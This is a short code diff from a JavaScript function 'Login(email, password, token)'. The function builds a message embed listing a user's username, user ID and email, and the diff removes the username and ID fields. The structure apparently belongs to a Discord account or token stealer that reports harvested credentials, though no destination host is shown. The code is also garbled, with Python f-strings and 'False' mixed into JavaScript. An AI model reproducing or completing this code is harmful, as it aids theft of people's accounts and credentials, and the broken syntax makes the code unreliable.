@@ -152,26 +152,6 @@ function Login(email, password, token) {
                     "color": 3092790,
                     "fields": [
                         {
-                            "name": " username",
-                            "value": ` - `json.username + "#" + json.discriminator``,
-                            "inline": true
-                        },
-			{
-			    "name": "᲼᲼",
-			    "value": f"᲼᲼",
-			    "inline": False
-			},
-                        {
-                            "name": " userid",
-                            "value": ` - `json.id``,
-                            "inline": true
-                        },
-			{
-			    "name": "᲼᲼",
-			    "value": f"᲼᲼",
-			    "inline": False
-			},
-                        {
                             "name": " email",
                             "value": ` - `${email}``,
                             "inline": true
